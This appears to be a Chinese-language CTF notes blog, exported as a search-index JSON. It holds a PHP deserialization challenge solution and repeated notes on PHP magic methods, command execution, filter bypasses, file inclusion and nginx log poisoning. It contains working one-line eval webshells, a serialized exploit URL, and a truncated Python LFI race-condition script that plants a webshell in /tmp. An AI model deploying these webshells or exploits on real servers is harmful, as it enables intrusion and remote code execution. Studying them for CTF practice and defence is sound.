catch 语句块捕获并导致致命错误。 5、__construct、__destruct __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用. 在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。 6、__clone PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。 7、__toString __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。 在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符） 从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。 8、__sleep、__wakeup __sleep 串行化的时候用 __wakeup 反串行化的时候调用 serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。 使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。 相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 9、__set_state 当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =\u003e value, …)格式排列的类属性。 10、__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效 11、__callStatic 它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。 同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:12","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛ez_unserialize"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]ez_unserialize\r没啥有效信息，扫描一下后台，发现 进入c145s.php，得到源代码 经典php反序列化，ChatGPT讲的很明确了 禁用错误报告。error_reporting(0); 可以禁用 PHP 的错误报告，以确保攻击者无法通过错误信息来了解代码的运行情况。 显示 cl45s.php 的源代码。show_source(\"cl45s.php\"); 用于将 cl45s.php 的源代码显示在页面上，这可以帮助攻击者更好地了解代码的运行情况和漏洞点。 定义 wllm 类。这个类具有两个公共属性 $admin 和 $passwd，分别用于存储用户名和密码。类中定义了两个方法，一个是构造函数 __construct()，用于初始化 $admin 和 $passwd 的值；另一个是析构函数 __destruct()，当对象被销毁时执行。 处理传入的参数。$p = $_GET['p']; 用于获取 URL 参数中名为 p 的值。 反序列化。unserialize($p); 将传入的参数 $p 进行反序列化处理，即将字符串转换为 PHP 对象。 调用析构函数。由于在反序列化时会调用对象的构造函数，因此在对象被销毁时会自动调用析构函数 __destruct()。在析构函数中，如果 $admin 的值为 \"admin\"，$passwd 的值为 \"ctf\"，则会包含一个名为 flag.php 的文件，并将其中的 $flag 变量输出到页面上。否则，会将 $admin 和 $passwd 的值输出到页面上，并输出一条提示信息。 传入以下参数得到flag http://1.14.71.254:28814/cl45s.php?p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;} [复习php反序列化] 什么是反序列化漏洞当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。 PHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。 以下是一些常见的php魔术方法： 1、__get、__set 这两个方法是为在类和他们的父类中没有声明的属性而设计的 __get( $property ) 当调用一个未定义的属性时访问此方法 __set( $property, $value ) 给一个未定义的属性赋值时调用 这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 2、__isset、__unset __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法 __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法 与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 3、__call __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法 4、__autoload __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。 5、__construct、__destruct __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用. 在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。 6、__clone PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。 7、__toString __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。 在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符） 从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。 8、__sleep、__wakeup __sleep 串行化的时候用 __wakeup 反串行化的时候调用 serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。 使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。 相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 9、__set_state 当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =\u003e value, …)格式排列的类属性。 10、__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效 11、__callStatic 它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。 同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:12","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#什么是反序列化漏洞"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]ez_unserialize\r没啥有效信息，扫描一下后台，发现 进入c145s.php，得到源代码 经典php反序列化，ChatGPT讲的很明确了 禁用错误报告。error_reporting(0); 可以禁用 PHP 的错误报告，以确保攻击者无法通过错误信息来了解代码的运行情况。 显示 cl45s.php 的源代码。show_source(\"cl45s.php\"); 用于将 cl45s.php 的源代码显示在页面上，这可以帮助攻击者更好地了解代码的运行情况和漏洞点。 定义 wllm 类。这个类具有两个公共属性 $admin 和 $passwd，分别用于存储用户名和密码。类中定义了两个方法，一个是构造函数 __construct()，用于初始化 $admin 和 $passwd 的值；另一个是析构函数 __destruct()，当对象被销毁时执行。 处理传入的参数。$p = $_GET['p']; 用于获取 URL 参数中名为 p 的值。 反序列化。unserialize($p); 将传入的参数 $p 进行反序列化处理，即将字符串转换为 PHP 对象。 调用析构函数。由于在反序列化时会调用对象的构造函数，因此在对象被销毁时会自动调用析构函数 __destruct()。在析构函数中，如果 $admin 的值为 \"admin\"，$passwd 的值为 \"ctf\"，则会包含一个名为 flag.php 的文件，并将其中的 $flag 变量输出到页面上。否则，会将 $admin 和 $passwd 的值输出到页面上，并输出一条提示信息。 传入以下参数得到flag http://1.14.71.254:28814/cl45s.php?p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;} [复习php反序列化] 什么是反序列化漏洞当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。 PHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。 以下是一些常见的php魔术方法： 1、__get、__set 这两个方法是为在类和他们的父类中没有声明的属性而设计的 __get( $property ) 当调用一个未定义的属性时访问此方法 __set( $property, $value ) 给一个未定义的属性赋值时调用 这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 2、__isset、__unset __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法 __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法 与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 3、__call __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法 4、__autoload __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。 5、__construct、__destruct __construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 __destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用. 在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。 6、__clone PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。 7、__toString __toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。 在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符） 从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。 8、__sleep、__wakeup __sleep 串行化的时候用 __wakeup 反串行化的时候调用 serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。 使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。 相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。 9、__set_state 当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =\u003e value, …)格式排列的类属性。 10、__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效 11、__callStatic 它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。 同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:12","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#php魔术方法"},{"categories":["web","notes"],"content":"一点php基础知识 ","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#"},{"categories":["web","notes"],"content":"\r一.PHP基础","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#一php基础"},{"categories":["web","notes"],"content":"\r0x1 PHP基本概念即“超文本处理器”，是在服务器端行的脚本语言，尤其适用于web开发并可嵌入HTML中，适合中小型网站的开发。 ","date":"2023-11-17","objectID":"/php/:1:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1-php基本概念"},{"categories":["web","notes"],"content":"\r0x2 PHP环境phpstudy ","date":"2023-11-17","objectID":"/php/:2:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2-php环境"},{"categories":["web","notes"],"content":"\r0x3PHP基础语法基础语法：函数名（函数参数）分号 函数可以有0个或多个函数，无函数就不写 有系统自带函数，用户也可以自定义函数 用?来区分文件和参数部分 参数部分用\u0026区分多个键值对 单个键值对用=分割出 键和值 echo 是一个语言结构，不是一个函数 \u003c?php echo \"hello world\"; ?\u003e $_GET \u003c?php $a=$_GET['a']; echo $a; ?\u003e $_POST \u003c?php $a=$_POST['a']; echo $a; ?\u003e 自定义函数 \u003c?php function add($a,$b) { return $a+$b; } $a=$_POST['a']; $b=$_POST['b']; $c=add($a,$b); echo $c; ?\u003e 危险函数 \u003c?php $cmd=$_POST['cmd']; system($cmd); ?\u003e ","date":"2023-11-17","objectID":"/php/:3:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3php基础语法"},{"categories":["web","notes"],"content":"\r0x4 PHP的命令执行命令执行一般指目标服务器上的命令执行，也就是远程命令执行。 英文缩写为RCE ◎Remote Command Exec ◎Remote Code Exec 默认讨论的服务器系统为Linux shell的分号**；来拆分命令，与\u0026\u0026**(url编码为%26%26，也可以分隔命令)的区别是： **\u0026\u0026需要前面命令执行成功后后面的命令才会执行(短路)，；**则不管成功与否，两个命令作为两行命令来执行 ||也表示或，但不短路 ","date":"2023-11-17","objectID":"/php/:4:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x4-php的命令执行"},{"categories":["web","notes"],"content":"\rPHP的Command Exec函数官方中有6种函数可执行系统命令 ◎system ◎passthru ◎exec ◎shell_exec ◎popen ◎pcntl_exec ","date":"2023-11-17","objectID":"/php/:4:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#php的command-exec函数"},{"categories":["web","notes"],"content":"\r0x5 过滤与绕过","date":"2023-11-17","objectID":"/php/:5:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x5-过滤与绕过"},{"categories":["web","notes"],"content":"\r◎黑名单过滤的绕过替换过滤，双写绕过 通配符*指代任意长度的字符 ？表示占位符，只指一个字符 error_reporting(0); //隐藏报错 highlight_file(_FILE_); //高亮显示源码 当我们遇到过滤flag关键字的时候，我们可以用通配符绕过 如果遇到过滤读取文件命令的情况，我们可以替换使用不熟悉但有类似作用的命令 在Linux环境中，反引号 ’ ‘ 表示执行 如果所有读取文件命令都被过滤，可以通过组合的形式来执行，例如： ls 'echo /bin' 等效于 ls /bin 甚至可以 （构造复合语法，通过base64编码等方法） 如果base64和echo也被过滤，可以通过变量拼接来绕过关键字 例如 ","date":"2023-11-17","objectID":"/php/:5:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#黑名单过滤的绕过"},{"categories":["web","notes"],"content":"\r◎符号过滤1.过滤空格的情况 (1)读取文件时，使用\u003c\u003e代替空格 (2)使用${IFS}代替空格，也可以使用$IFS$9代替空格，bash下甚至可以使用{cmd,args}代替空格 (3)控制字符代替空格%09 %0b %0c (4)字符串截取空格 (5)当然也可以通过burp来爆破一下可用字符表示空格 ","date":"2023-11-17","objectID":"/php/:5:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#符号过滤"},{"categories":["web","notes"],"content":"\r◎不回显能把不回显的数据传输出来让我们看到所用到的数据传输路径，叫做通道 认识一个危险函数：shell_exec 和system函数的区别：shell_exec并不把执行结果输出到当前页面，而是作为字符串返回，如果页面没有事输出这个字符串，我们则看不到结果。 (1)写入文件、二次返回(基于文件的数据带出) 无法直接看到信息，将信息写入文件，在通过读取文件进行信息获得 比如写入1.txt，再访问url+1.txt就可实现数据传回 在shell中，我们可以使用\u003e符号来写文件 (2)DNS通道 如果当前目录不可写入,可通过DNS解析记录将数据传回 http://www.dnslog.cn/ ","date":"2023-11-17","objectID":"/php/:5:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#不回显"},{"categories":["web","notes"],"content":"\r0x6 PHP文件上传机制\r","date":"2023-11-17","objectID":"/php/:6:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x6-php文件上传机制"},{"categories":["web","notes"],"content":"\r[php弱类型比较]php弱类型比较中，数字和字符串比较中，字符串转换成数字的过程中，会取字符串前面数字的值作为整个字符串转换成数字的值，比较“1admin”,转换成数字就是1，所以\"admin1\"的话，因为字符串没有数字，只能转换成0了，所以第一个才会是true。 而最后一个则是被php当成科学计数法的，计算，所以结果都是0，比较时会相等。 0x03: md5碰撞和strcmp函数绕过，可以看我的另外一篇博客。 0x04: is_numeric()函数会判断如果是数字和数字字符串的话，会返回true,否则返回false; ","date":"2023-11-17","objectID":"/php/:6:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#php弱类型比较"},{"categories":["web","notes"],"content":"\r二.PHP代码执行","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#二php代码执行"},{"categories":["web","notes"],"content":"\r0x1 什么是PHP代码执行可控指PHP可解释执行的代码，PHP中有专门将字符串当做PHP代码执行的语言eval，通过控制eval里面的参数控制PHP代码的执行 eval(\"要执行的PHP代码\"); ","date":"2023-11-17","objectID":"/php/:1:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1-什么是php代码执行"},{"categories":["web","notes"],"content":"\r0x2 代码执行和命令执行的区别执行参数不同 代码执行的是PHP后者其他语言的代码，比如phpinfo() 而命令执行，一般执行的是shell命令，比如ls / system 命令执行 shell_exec 命令执行 eval 代码执行 ","date":"2023-11-17","objectID":"/php/:2:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2-代码执行和命令执行的区别"},{"categories":["web","notes"],"content":"\r0x3 PHP代码执行的格式在PHP语言中，代码分为三种 ","date":"2023-11-17","objectID":"/php/:3:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3-php代码执行的格式"},{"categories":["web","notes"],"content":"\r1.函数调用函数特征：函数名字，函数参数，返回值 基本的语法： 函数名 （ 参数 ）； error_reporting ( 0 ) ; ","date":"2023-11-17","objectID":"/php/:3:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#1函数调用"},{"categories":["web","notes"],"content":"\r2.类方法调用类的特征：类实例，方法名，方法参数，返回值 ？？？动态函数调用 ？？？静态函数调用 ","date":"2023-11-17","objectID":"/php/:3:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#2类方法调用"},{"categories":["web","notes"],"content":"\r3.语言结构调用 echo \" ctfshow \" ; ","date":"2023-11-17","objectID":"/php/:3:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#3语言结构调用"},{"categories":["web","notes"],"content":"\r0x4 PHP代码执行后门 \u003c?php eval($_POST[1]); ?\u003e 最简单的PHP一句话后门，也叫PHP小马，如果我们想在服务器上(Windows系统)弹出计算器，发送POST请求即可： 1=system(\"calc\"); ——\u003e蚁剑 url地址：xxxxx 连接密码：1 若木马接收代码为eval($_GET[1]); 我们需要手动写一个转接头，加在GET型请求的url后面： （GET转POST转接头） ?1=eval(\\$_POST[1]); ","date":"2023-11-17","objectID":"/php/:4:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x4-php代码执行后门"},{"categories":["web","notes"],"content":"\r0x5 代码执行的类型函数名+函数类型可控=可以执行任意代码 1.危险函数型 (\"sys\".\"tem\")=system \u003cscript language=\"php\"\u003eeval($_POST[1])\u003c/script\u003e php5.6版本以前的可用 最短木马： \u003c?`$_GET[2]`;\u00262= ","date":"2023-11-17","objectID":"/php/:5:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x5-代码执行的类型"},{"categories":["web","notes"],"content":"\r三.PHP文件包含该笔记借鉴了CSDN博主「ing_end」的原创文章， 原文链接：https://blog.csdn.net/ing_end/article/details/123886703 ","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#三php文件包含"},{"categories":["web","notes"],"content":"\r0x1何为包含：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数 的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。 ","date":"2023-11-17","objectID":"/php/:0:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1何为包含"},{"categories":["web","notes"],"content":"\r0x2文件包含漏洞的产生：程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。 文件上传JEG PNG JPEG GlF先上传PNG图片马，然后再包含。 ","date":"2023-11-17","objectID":"/php/:0:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2文件包含漏洞的产生"},{"categories":["web","notes"],"content":"\r0x3文件包含语句：include( ) 文件包含失败时，会产生警告，脚本会继续运行。 include_once() 与include()功能相同，文件只会被包含一次。 require( ) 文件包含失败时，会产生错误，直接结束脚本执行。 require_once( ) 与require( )功能相同，文件只会被包含一次。 ","date":"2023-11-17","objectID":"/php/:0:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3文件包含语句"},{"categories":["web","notes"],"content":"\r0x4相关配置：一般来讲，文件包含有本机文件包含和远程文件包含之分： 本地文件包含就是可以读取和打开本地文件 远程文件包含（http，ftp，php伪协议）就是可以远程加载文件 我们可以通过php.ini来进行配置。如下： allow_url_fopen=On/Off 本地文件包含(LFI)（开和关都可包含本地文件） allow_url_include=On/Off 远程文件包含(RFI) ","date":"2023-11-17","objectID":"/php/:0:4","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x4相关配置"},{"categories":["web","notes"],"content":"\r0x5伪协议：计算机中常见的协议: ◎网络层协议：IP协议、ICMP协议、ARP协议、IGMP协议 ◎应用层协议：HTTP协议、HTTPS协议、FTP协议、SSH协议、RDP协议、gopher协议、qq拉起协议、百度云盘拉起协议 PHP中的伪协议：file协议、php协议、data协议 （一下部分内容摘自charmersix www.charmersix.icu） ","date":"2023-11-17","objectID":"/php/:0:5","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x5伪协议"},{"categories":["web","notes"],"content":"\r0x6文件包含高级利用\r文件包含可控点 文件名可控：可以控制协议头，优先使用data协议 后缀可控：可以考虑路径跳转，参考file协议 ../../../../ nginx日志包含nginx 的默认路径 /var/log/nginx/access.log 这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行 然后再读取/var/log/nginx/access.log执行日志里的恶意代码 常见出错地方（为正确内容） 包含的文件路径错误（/var/log/nginx/access.log） 写入的UA语法错误（\u003c?php eval($_POST[1]); ?\u003e） 转义错误（file_put_contents(\"1.php\",\"\u003c?php eval($_POST[1]);?\u003e\");） php语法在双引号中的时需要转义，否则判断为空 ","date":"2023-11-17","objectID":"/php/:0:6","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x6文件包含高级利用"},{"categories":["web","notes"],"content":"\r0x6文件包含高级利用\r文件包含可控点 文件名可控：可以控制协议头，优先使用data协议 后缀可控：可以考虑路径跳转，参考file协议 ../../../../ nginx日志包含nginx 的默认路径 /var/log/nginx/access.log 这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行 然后再读取/var/log/nginx/access.log执行日志里的恶意代码 常见出错地方（为正确内容） 包含的文件路径错误（/var/log/nginx/access.log） 写入的UA语法错误（\u003c?php eval($_POST[1]); ?\u003e） 转义错误（file_put_contents(\"1.php\",\"\u003c?php eval($_POST[1]);?\u003e\");） php语法在双引号中的时需要转义，否则判断为空 ","date":"2023-11-17","objectID":"/php/:0:6","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#文件包含可控点"},{"categories":["web","notes"],"content":"\r0x6文件包含高级利用\r文件包含可控点 文件名可控：可以控制协议头，优先使用data协议 后缀可控：可以考虑路径跳转，参考file协议 ../../../../ nginx日志包含nginx 的默认路径 /var/log/nginx/access.log 这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行 然后再读取/var/log/nginx/access.log执行日志里的恶意代码 常见出错地方（为正确内容） 包含的文件路径错误（/var/log/nginx/access.log） 写入的UA语法错误（\u003c?php eval($_POST[1]); ?\u003e） 转义错误（file_put_contents(\"1.php\",\"\u003c?php eval($_POST[1]);?\u003e\");） php语法在双引号中的时需要转义，否则判断为空 ","date":"2023-11-17","objectID":"/php/:0:6","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#nginx日志包含"},{"categories":["web","notes"],"content":"\r临时文件包含phpinfo(); 竞争上传，这里有个python2的脚本 #!/usr/bin/python import sys import threading import socket def setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r \u003c?php file_put_contents('/tmp/g', '\u003c?=eval($_REQUEST[1])?\u003e')?\u003e\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\r Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r Content-Type: text/plain\\r \\r %s -----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\r Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\r HTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r HTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\r HTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\r HTTP_PRAGMA: \"\"\"+padding+\"\"\"\\r Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r Content-Length: %s\\r Host: %s\\r \\r %s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /lfi.php?file=%s HTTP/1.1\\r User-Agent: Mozilla/4.0\\r Proxy-Connection: Keep-Alive\\r Host: %s\\r \\r \\r \"\"\" return (REQ1, TAG, LFIREQ) def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) \u003c offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =\u0026gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fn counter=0 class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter \u003e= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =\u0026gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256 def main(): print \"LFI 